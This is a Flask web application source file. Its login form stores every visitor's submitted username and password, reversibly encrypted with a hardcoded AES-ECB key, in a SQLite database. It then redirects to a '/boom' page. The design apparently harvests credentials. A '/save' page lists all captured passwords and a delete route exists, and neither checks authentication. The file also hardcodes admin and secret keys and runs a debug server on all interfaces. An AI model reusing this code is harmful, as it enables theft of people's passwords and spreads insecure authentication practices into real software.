from flask import Flask, render_template,request,redirect,url_for,session
import sqlite3
from Crypto.Cipher import AES
import base64
import hashlib

app = Flask(__name__)
app.secret_key='arya29!!'



SECRET_KEY = "arya29!!"

def get_aes_key(key_str):
    return hashlib.sha256(key_str.encode()).digest()[:16]  # AES-128 key

def pad(text):
    while len(text) % 16 != 0:
        text += ' '
    return text

def encrypt(plain_text, key):
    aes_key = get_aes_key(key)
    cipher = AES.new(aes_key, AES.MODE_ECB)
    padded = pad(plain_text)
    encrypted_bytes = cipher.encrypt(padded.encode())
    return base64.b64encode(encrypted_bytes).decode()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'arya' and password == 'ArY@Secure2024!':
            session['admin'] = True
            return redirect(url_for('show_data'))
        encrypted_password = encrypt(password, SECRET_KEY)
        # Save to SQLite
        conn = sqlite3.connect('form_data.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO applications (username, password)
            VALUES (?, ?)
        ''', (username, encrypted_password))
        conn.commit()
        conn.close()

        return redirect(url_for('arjun'))

    return render_template('index.html')

@app.route('/boom')
def arjun():
    return render_template('post.html')
@app.route('/delete/<int:id>', methods=['POST'])
def delete_user(id):
    conn = sqlite3.connect('form_data.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM applications WHERE id = ?", (id,))
    conn.commit()
    conn.close()
    return redirect(url_for('show_data'))

@app.route('/save')
def show_data():
    conn = sqlite3.connect('form_data.db')
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password FROM applications")
    data = cursor.fetchall()
    conn.close()
    return render_template('show.html', users=data)
    

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)

